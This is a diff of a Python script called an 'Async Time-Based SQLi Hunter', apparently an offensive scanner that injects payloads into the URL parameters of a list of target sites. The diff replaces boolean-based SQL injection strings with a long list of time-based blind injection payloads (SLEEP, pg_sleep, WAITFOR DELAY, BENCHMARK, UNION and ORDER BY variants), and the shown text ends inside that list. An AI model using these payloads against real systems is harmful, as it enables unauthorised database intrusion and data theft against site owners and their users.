@@ -1,44 +1,337 @@
 #!/usr/bin/env python3
 import aiohttp
 import asyncio
-from urllib.parse import urlparse, parse_qsl, urlencode
+from urllib.parse import urlparse, parse_qsl
 import sys
 import random
+import time
 
 # Random author pick
 authors = ["Eth3rnal", "Myst1cAura", "D-Sentinel"]
-print(f"By {random.choice(authors)} - LQL Async SQLi Hunter")
+print(f"By {random.choice(authors)} - LQL Async Time-Based SQLi Hunter")
 
 if len(sys.argv) < 2:
     print(f"Usage: {sys.argv[0]} <urls_file>")
     sys.exit(1)
 
 urls_file = sys.argv[1]
-results_file = "lql_results.txt"
+results_file = "lql_time_results.txt"
 
-# Updated payloads: true, false1, false2
+# One-dimensional payload list (sleep ~10s for clearer signal)
 payloads = [
-    ['" OR "1"="1', '" OR "1"="2', '" OR "1"="242"'],
-    ["' OR '1'='1", "' OR '1'='2", "' OR '1'='242"],
-    [" OR 1=1", " OR 1=2", " OR 1=242"],
-    ['" OR "a"="a', '" OR "a"="b', '" OR "a"="c"'],
-    ["' OR 'a'='a", "' OR 'a'='b", "' OR 'a'='c"],
-    ['" OR "432%25"="432', '" OR "432%25"="44', '" OR "432%25"="999"'],
-    ["' OR '432%25'='432", "' OR '432%25'='44", "' OR '432%25'='999'"],
-    ["') OR ('1'='1", "') OR ('1'='2", "') OR ('1'='3"],
-    ['") OR ("1"="1', '") OR ("1"="2', '") OR ("1"="3'],
-    ["' OR '1'='1' -- ", "' OR '1'='2' -- ", "' OR '1'='3' -- "],
-    ['" OR "1"="1" -- ', '" OR "1"="2" -- ', '" OR "1"="3" -- '],
-    ["1) OR (1=1", "1) OR (1=2", "1) OR (1=3"],
-    ["' OR 1=1#", "' OR 1=2#", "' OR 1=3#"],
-    ['" OR 1=1#', '" OR 1=2#', '" OR 1=3#'],
-    ["' OR username LIKE 'a%' -- ", "' OR username LIKE 'b%' -- ", "' OR username LIKE 'c%' -- "],
-    ['" OR email LIKE "a%" -- ', '" OR email LIKE "b%" -- ', '" OR email LIKE "c%" -- '],
-    ["' AND updatexml(1,concat(0x7e,user()),1) -- ", "' AND updatexml(1,concat(0x7e,version()),1) -- ", "' AND updatexml(1,concat(0x7e,database()),1) -- "],
-    ['" AND extractvalue(1,concat(0x7e,database())) -- ', '" AND extractvalue(1,concat(0x7e,version())) -- ', '" AND extractvalue(1,concat(0x7e,user())) -- '],
+""",(select * from (select(sleep(10)))a)""",
+"""%2c(select%20*%20from%20(select(sleep(10)))a)""",
+"""';WAITFOR DELAY '0:0:30'--""",
+"""sleep(10)#""",
+"""1 or sleep(10)#""",
+"""" or sleep(10)#""",
+"""' or sleep(10)#""",
+"""" or sleep(10)=\"""",
+"""' or sleep(10)='""",
+"""1) or sleep(10)#""",
+"""") or sleep(10)=\"""",
+"""') or sleep(10)='""",
+"""1)) or sleep(10)#""",
+"""")) or sleep(10)=\"""",
+"""')) or sleep(10)='""",
+""";waitfor delay '0:0:10'--""",
+""");waitfor delay '0:0:10'--""",
+"""';waitfor delay '0:0:10'--""",
+"""";waitfor delay '0:0:10'--""",
+"""');waitfor delay '0:0:10'--""",
+"""");waitfor delay '0:0:10'--""",
+"""));waitfor delay '0:0:10'--""",
+"""'));waitfor delay '0:0:10'--""",
+""""));waitfor delay '0:0:10'--""",
+"""pg_sleep(10)--""",
+"""1 or pg_sleep(10)--""",
+"""" or pg_sleep(10)--""",
+"""' or pg_sleep(10)--""",
+"""1) or pg_sleep(10)--""",
+"""") or pg_sleep(10)--""",
+"""') or pg_sleep(10)--""",
+"""1)) or pg_sleep(10)--""",
+"""")) or pg_sleep(10)--""",
+"""')) or pg_sleep(10)--""",
+"""AND (SELECT * FROM (SELECT(SLEEP(10)))bAKL) AND 'vRxe'='vRxe""",
+"""AND (SELECT * FROM (SELECT(SLEEP(10)))YjoC) AND '%'='""",
+"""AND (SELECT * FROM (SELECT(SLEEP(10)))nQIP)""",
+"""AND (SELECT * FROM (SELECT(SLEEP(10)))nQIP)--""",
+"""AND (SELECT * FROM (SELECT(SLEEP(10)))nQIP)#""",
+"""SLEEP(10)#""",
+"""SLEEP(10)--""",
+"""SLEEP(10)=\"""",
+"""SLEEP(10)='""",
+"""or SLEEP(10)""",
+"""or SLEEP(10)#""",
+"""or SLEEP(10)--""",
+"""or SLEEP(10)=\"""",
+"""or SLEEP(10)='""",
+"""waitfor delay '00:00:10'""",
+"""waitfor delay '00:00:10'--""",
+"""waitfor delay '00:00:10'#""",
+"""pg_SLEEP(10)""",
+"""pg_SLEEP(10)--""",
+"""pg_SLEEP(10)#""",
+"""or pg_SLEEP(10)""",
+"""or pg_SLEEP(10)--""",
+"""or pg_SLEEP(10)#""",
+"""AnD SLEEP(10)""",
+"""AnD SLEEP(10)--""",
+"""AnD SLEEP(10)#""",
+"""&&SLEEP(10)""",
+"""&&SLEEP(10)--""",
+"""&&SLEEP(10)#""",
+"""' AnD SLEEP(10) ANd '1""",
+"""'&&SLEEP(10)&&'1""",
+"""ORDER BY SLEEP(10)""",
+"""ORDER BY SLEEP(10)--""",
+"""ORDER BY SLEEP(10)#""",
+"""(SELECT * FROM (SELECT(SLEEP(10)))ecMj)""",
+"""(SELECT * FROM (SELECT(SLEEP(10)))ecMj)#""",
+"""(SELECT * FROM (SELECT(SLEEP(10)))ecMj)--""",
+"""+ SLEEP(10) + '""",
+"""SLEEP(1)/*' or SLEEP(1) or '" or SLEEP(1) or "*/""",
+""" ORDER BY SLEEP(10)""",
+""" ORDER BY 1,SLEEP(10)""",
+""" ORDER BY 1,SLEEP(10),BENCHMARK(1000000,MD5('A'))""",
+""" ORDER BY 1,SLEEP(10),BENCHMARK(1000000,MD5('A')),4""",
+""" ORDER BY 1,SLEEP(10),BENCHMARK(1000000,MD5('A')),4,5""",
+""" ORDER BY 1,SLEEP(10),BENCHMARK(1000000,MD5('A')),4,5,6""",
+""" ORDER BY 1,SLEEP(10),BENCHMARK(1000000,MD5('A')),4,5,6,7""",
+""" ORDER BY 1,SLEEP(10),BENCHMARK(1000000,MD5('A')),4,5,6,7,8""",
+""" ORDER BY 1,SLEEP(10),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9""",
+""" ORDER BY 1,SLEEP(10),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10""",
+""" ORDER BY 1,SLEEP(10),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11""",
+""" ORDER BY 1,SLEEP(10),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12""",
+""" ORDER BY 1,SLEEP(10),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13""",
+""" ORDER BY 1,SLEEP(10),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14""",
+""" ORDER BY 1,SLEEP(10),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14""",
+""" ORDER BY 1,SLEEP(10),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15""",
+""" ORDER BY 1,SLEEP(10),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16""",
+""" ORDER BY 1,SLEEP(10),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17""",
+""" ORDER BY 1,SLEEP(10),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18""",
+""" ORDER BY 1,SLEEP(10),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19""",
+""" ORDER BY 1,SLEEP(10),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20""",
+""" ORDER BY 1,SLEEP(10),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21""",
+""" ORDER BY 1,SLEEP(10),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22""",
+""" ORDER BY 1,SLEEP(10),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23""",
+""" ORDER BY 1,SLEEP(10),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24""",
+""" ORDER BY 1,SLEEP(10),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25""",
+""" ORDER BY 1,SLEEP(10),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26""",
+""" ORDER BY 1,SLEEP(10),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27""",
+""" ORDER BY 1,SLEEP(10),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28""",
+""" ORDER BY 1,SLEEP(10),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29""",
+""" ORDER BY 1,SLEEP(10),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30""",
+""" ORDER BY SLEEP(10)#""",
+""" ORDER BY 1,SLEEP(10)#""",
+""" ORDER BY 1,SLEEP(10),3#""",
+""" ORDER BY 1,SLEEP(10),3,4#""",
+""" ORDER BY 1,SLEEP(10),BENCHMARK(1000000,MD5('A')),4,5#""",
+""" ORDER BY 1,SLEEP(10),BENCHMARK(1000000,MD5('A')),4,5,6#""",
+""" ORDER BY 1,SLEEP(10),BENCHMARK(1000000,MD5('A')),4,5,6,7#""",
+""" ORDER BY 1,SLEEP(10),BENCHMARK(1000000,MD5('A')),4,5,6,7,8#""",
+""" ORDER BY 1,SLEEP(10),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9#""",
+""" ORDER BY 1,SLEEP(10),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10#""",
+""" ORDER BY 1,SLEEP(10),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11#""",
+""" ORDER BY 1,SLEEP(10),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12#""",
+""" ORDER BY 1,SLEEP(10),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13#""",
+""" ORDER BY 1,SLEEP(10),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14#""",
+""" ORDER BY 1,SLEEP(10),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14#""",
+""" ORDER BY 1,SLEEP(10),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15#""",
+""" ORDER BY 1,SLEEP(10),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16#""",
+""" ORDER BY 1,SLEEP(10),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17#""",
+""" ORDER BY 1,SLEEP(10),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18#""",
+""" ORDER BY 1,SLEEP(10),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19#""",
+""" ORDER BY 1,SLEEP(10),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#""",
+""" ORDER BY 1,SLEEP(10),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21#""",
+""" ORDER BY 1,SLEEP(10),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#""",
+""" ORDER BY 1,SLEEP(10),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23#""",
+""" ORDER BY 1,SLEEP(10),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24#""",
+""" ORDER BY 1,SLEEP(10),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25#""",
+""" ORDER BY 1,SLEEP(10),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26#""",
+""" ORDER BY 1,SLEEP(10),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27#""",
+""" ORDER BY 1,SLEEP(10),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28#""",
+""" ORDER BY 1,SLEEP(10),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29#""",
+""" ORDER BY 1,SLEEP(10),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30#""",
+""" ORDER BY SLEEP(10)-- """,
+""" ORDER BY 1,SLEEP(10)-- """,
+""" ORDER BY 1,SLEEP(10),3-- """,
+""" ORDER BY 1,SLEEP(10),3,4-- """,
+""" ORDER BY 1,SLEEP(10),BENCHMARK(1000000,MD5('A')),4,5-- """,
+""" ORDER BY 1,SLEEP(10),BENCHMARK(1000000,MD5('A')),4,5,6-- """,
+""" ORDER BY 1,SLEEP(10),BENCHMARK(1000000,MD5('A')),4,5,6,7-- """,
+""" ORDER BY 1,SLEEP(10),BENCHMARK(1000000,MD5('A')),4,5,6,7,8-- """,
+""" ORDER BY 1,SLEEP(10),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9-- """,
+""" ORDER BY 1,SLEEP(10),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10-- """,
+""" ORDER BY 1,SLEEP(10),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11-- """,
+""" ORDER BY 1,SLEEP(10),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12-- """,
+""" ORDER BY 1,SLEEP(10),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13-- """,
+""" ORDER BY 1,SLEEP(10),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14-- """,
+""" ORDER BY 1,SLEEP(10),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14-- """,
+""" ORDER BY 1,SLEEP(10),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15-- """,
+""" ORDER BY 1,SLEEP(10),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16-- """,
+""" ORDER BY 1,SLEEP(10),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17-- """,
+""" ORDER BY 1,SLEEP(10),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18-- """,
+""" ORDER BY 1,SLEEP(10),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19-- """,
+""" ORDER BY 1,SLEEP(10),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20-- """,
+""" ORDER BY 1,SLEEP(10),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21-- """,
+""" ORDER BY 1,SLEEP(10),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22-- """,
+""" ORDER BY 1,SLEEP(10),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23-- """,
+""" ORDER BY 1,SLEEP(10),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24-- """,
+""" ORDER BY 1,SLEEP(10),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25-- """,
+""" ORDER BY 1,SLEEP(10),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26-- """,
+""" ORDER BY 1,SLEEP(10),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27-- """,
+""" ORDER BY 1,SLEEP(10),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28-- """,
+""" ORDER BY 1,SLEEP(10),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29-- """,
+""" ORDER BY 1,SLEEP(10),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30-- """,
+""" UNION SELECT @@VERSION,SLEEP(10),3""",
+""" UNION SELECT @@VERSION,SLEEP(10),USER(),4""",
+""" UNION SELECT @@VERSION,SLEEP(10),USER(),BENCHMARK(1000000,MD5('A')),5""",
+""" UNION SELECT @@VERSION,SLEEP(10),USER(),BENCHMARK(1000000,MD5('A')),5,6""",
+""" UNION SELECT @@VERSION,SLEEP(10),USER(),BENCHMARK(1000000,MD5('A')),5,6,7""",
+""" UNION SELECT @@VERSION,SLEEP(10),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8""",
+""" UNION SELECT @@VERSION,SLEEP(10),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9""",
+""" UNION SELECT @@VERSION,SLEEP(10),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10""",
+""" UNION SELECT @@VERSION,SLEEP(10),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11""",
+""" UNION SELECT @@VERSION,SLEEP(10),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12""",
+""" UNION SELECT @@VERSION,SLEEP(10),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13""",
+""" UNION SELECT @@VERSION,SLEEP(10),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14""",
+""" UNION SELECT @@VERSION,SLEEP(10),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15""",
+""" UNION SELECT @@VERSION,SLEEP(10),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16""",
+""" UNION SELECT @@VERSION,SLEEP(10),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17""",
+""" UNION SELECT @@VERSION,SLEEP(10),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18""",
+""" UNION SELECT @@VERSION,SLEEP(10),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19""",
+""" UNION SELECT @@VERSION,SLEEP(10),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20""",
+""" UNION SELECT @@VERSION,SLEEP(10),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21""",
+""" UNION SELECT @@VERSION,SLEEP(10),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22""",
+""" UNION SELECT @@VERSION,SLEEP(10),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23""",
+""" UNION SELECT @@VERSION,SLEEP(10),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24""",
+""" UNION SELECT @@VERSION,SLEEP(10),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25""",
+""" UNION SELECT @@VERSION,SLEEP(10),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26""",
+""" UNION SELECT @@VERSION,SLEEP(10),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27""",
+""" UNION SELECT @@VERSION,SLEEP(10),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28""",
+""" UNION SELECT @@VERSION,SLEEP(10),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29""",
+""" UNION SELECT @@VERSION,SLEEP(10),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30""",
+""" UNION SELECT @@VERSION,SLEEP(10),"'3""",
+""" UNION SELECT @@VERSION,SLEEP(10),"'3'"#""",
+""" UNION SELECT @@VERSION,SLEEP(10),USER(),4#""",
+""" UNION SELECT @@VERSION,SLEEP(10),USER(),BENCHMARK(1000000,MD5('A')),5#""",
+""" UNION SELECT @@VERSION,SLEEP(10),USER(),BENCHMARK(1000000,MD5('A')),5,6#""",
+""" UNION SELECT @@VERSION,SLEEP(10),USER(),BENCHMARK(1000000,MD5('A')),5,6,7#""",
+""" UNION SELECT @@VERSION,SLEEP(10),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8#""",
+""" UNION SELECT @@VERSION,SLEEP(10),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9#""",
+""" UNION SELECT @@VERSION,SLEEP(10),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10#""",
+""" UNION SELECT @@VERSION,SLEEP(10),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11#""",
+""" UNION SELECT @@VERSION,SLEEP(10),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12#""",
+""" UNION SELECT @@VERSION,SLEEP(10),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13#""",
+""" UNION SELECT @@VERSION,SLEEP(10),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14#""",
+""" UNION SELECT @@VERSION,SLEEP(10),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15#""",
+""" UNION SELECT @@VERSION,SLEEP(10),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16#""",
+""" UNION SELECT @@VERSION,SLEEP(10),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17#""",
+""" UNION SELECT @@VERSION,SLEEP(10),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18#""",
+""" UNION SELECT @@VERSION,SLEEP(10),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19#""",
+""" UNION SELECT @@VERSION,SLEEP(10),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#""",
+""" UNION SELECT @@VERSION,SLEEP(10),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21#""",
+""" UNION SELECT @@VERSION,SLEEP(10),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#""",
+""" UNION SELECT @@VERSION,SLEEP(10),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23#""",
+""" UNION SELECT @@VERSION,SLEEP(10),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24#""",
+""" UNION SELECT @@VERSION,SLEEP(10),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25#""",
+""" UNION SELECT @@VERSION,SLEEP(10),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26#""",
+""" UNION SELECT @@VERSION,SLEEP(10),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27#""",
+""" UNION SELECT @@VERSION,SLEEP(10),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28#""",
+""" UNION SELECT @@VERSION,SLEEP(10),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29#""",
+""" UNION SELECT @@VERSION,SLEEP(10),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30#""",
+""" UNION ALL SELECT SLEEP(10)-- """,
+""" UNION ALL SELECT USER(),SLEEP(10)-- """,
+""" UNION ALL SELECT @@VERSION,USER(),SLEEP(10)-- """,
+""" UNION ALL SELECT @@VERSION,USER(),SLEEP(10),BENCHMARK(1000000,MD5('A'))-- """,
+""" UNION ALL SELECT @@VERSION,USER(),SLEEP(10),BENCHMARK(1000000,MD5('A')),NULL-- """,
+""" UNION ALL SELECT @@VERSION,USER(),SLEEP(10),BENCHMARK(1000000,MD5('A')),NULL,NULL-- """,
+""" UNION ALL SELECT @@VERSION,USER(),SLEEP(10),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL-- """,
+""" UNION ALL SELECT @@VERSION,USER(),SLEEP(10),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL-- """,
+""" UNION ALL SELECT @@VERSION,USER(),SLEEP(10),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL-- """,
+""" UNION ALL SELECT @@VERSION,USER(),SLEEP(10),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL-- """,
+""" UNION ALL SELECT @@VERSION,USER(),SLEEP(10),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL-- """,
+""" UNION ALL SELECT @@VERSION,USER(),SLEEP(10),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- """,
+""" UNION ALL SELECT @@VERSION,USER(),SLEEP(10),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- """,
+""" UNION ALL SELECT @@VERSION,USER(),SLEEP(10),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- """,
+""" UNION ALL SELECT @@VERSION,USER(),SLEEP(10),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- """,
+""" UNION ALL SELECT @@VERSION,USER(),SLEEP(10),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- """,
+""" UNION ALL SELECT @@VERSION,USER(),SLEEP(10),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- """,
+""" UNION ALL SELECT @@VERSION,USER(),SLEEP(10),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- """,
+""" UNION ALL SELECT @@VERSION,USER(),SLEEP(10),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- """,
+""" UNION ALL SELECT @@VERSION,USER(),SLEEP(10),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- """,
+""" UNION ALL SELECT @@VERSION,USER(),SLEEP(10),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- """,
+""" UNION ALL SELECT @@VERSION,USER(),SLEEP(10),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- """,
+""" UNION ALL SELECT @@VERSION,USER(),SLEEP(10),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- """,
